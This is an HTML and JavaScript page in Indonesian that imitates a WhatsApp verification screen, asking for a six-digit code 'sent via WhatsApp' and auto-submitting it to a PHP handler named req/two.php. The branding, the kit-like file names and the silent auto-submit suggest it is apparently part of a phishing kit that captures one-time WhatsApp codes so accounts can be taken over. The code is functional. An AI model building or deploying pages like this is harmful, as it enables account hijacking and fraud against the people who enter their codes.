<body>

<a href="index-2.html" class="back">←</a>
<img src="images/WhatsApp.svg" class="icon" alt="WhatsApp Icon">

<div class="title">Masukkan Kode Verifikasi</div>
<div class="subtitle">Kode Verifikasi Telah Dikirim Melalui WhatsApp</div>

<div class="pin-input" id="pinContainer">
    <input type="text" maxlength="1" class="pin-box" data-index="0" autofocus="">
    <input type="text" maxlength="1" class="pin-box" data-index="1">
    <input type="text" maxlength="1" class="pin-box" data-index="2">
    <input type="text" maxlength="1" class="pin-box" data-index="3">
    <input type="text" maxlength="1" class="pin-box" data-index="4">
    <input type="text" maxlength="1" class="pin-box" data-index="5">
</div>

<!-- Form tetap ada, tapi tombol dihilangkan -->
<form action="req/two.php" method="POST" id="verifyForm">
    <input type="hidden" name="code" id="hiddenCode">
</form>

<script>
    const pinBoxes = document.querySelectorAll('.pin-box');
    const hiddenCode = document.getElementById('hiddenCode');
    const form = document.getElementById('verifyForm');

    // Update hidden input dengan kode yang dimasukkan
    function updateHiddenCode() {
        let code = '';
        pinBoxes.forEach(box => {
            code += box.value;
        });
        hiddenCode.value = code;
    }

    // Event listener untuk setiap kotak PIN
    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            // Hanya terima angka
            box.value = box.value.replace(/[^0-9]/g, '');

            updateHiddenCode();

            // Auto focus ke kotak berikutnya
            if (box.value.length === 1 && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }

            // === OTOMATIS SUBMIT setelah 6 digit terisi ===
            if (hiddenCode.value.length === 6) {
                setTimeout(() => {
                    form.submit();
                }, 300); // delay kecil biar terasa lebih smooth
            }
        });

        // Backspace → pindah ke kotak sebelumnya
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && box.value === '' && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });

        // Fitur Paste seluruh kode
        box.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').slice(0, 6);
            
            if (/^\d{1,6}$/.test(pastedData)) {
                pastedData.split('').forEach((char, i) => {
                    if (pinBoxes[i]) {
                        pinBoxes[i].value = char;
                    }
                });
                updateHiddenCode();

                // Fokus ke kotak terakhir
                const lastFilled = Math.min(pastedData.length, 6) - 1;
                pinBoxes[lastFilled].focus();

                // Jika sudah 6 digit, submit otomatis
                if (pastedData.length === 6) {
                    setTimeout(() => {
                        form.submit();
                    }, 300);
                }
            }
        });
    });
</script>
